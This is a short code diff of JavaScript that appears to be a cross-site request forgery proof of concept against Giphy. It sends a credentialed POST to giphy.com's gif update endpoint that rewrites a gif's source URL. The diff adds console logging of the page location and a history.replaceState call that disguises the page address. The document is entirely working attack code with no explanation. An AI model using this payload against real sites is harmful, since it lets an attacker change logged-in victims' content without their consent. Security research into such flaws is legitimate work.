@@ -11,7 +11,14 @@ var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
     xhr.open("post", "https://giphy.com/ajax/gif/update", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.setRequestHeader("Accept", "application/Json");
+   
+xhr.setRequestHeader("Accept", "application/Json");
+console.log("HREF: " + window.location.href);
+console.log("Hostname: " + window.location.hostname);
+console.log("Path: " +  window.location.pathname);
+console.log("Search: " + window.location.search);
+
+window.history.replaceState(null, '', 'gifs/aJKqx5Wy1yZpIyF4BW');
     
 
     xhr.send("gif_id=pXuuwZj9u3Ar1GgivY&key=source_post_url&value=http%3A%2F%2Ftestus.COM");
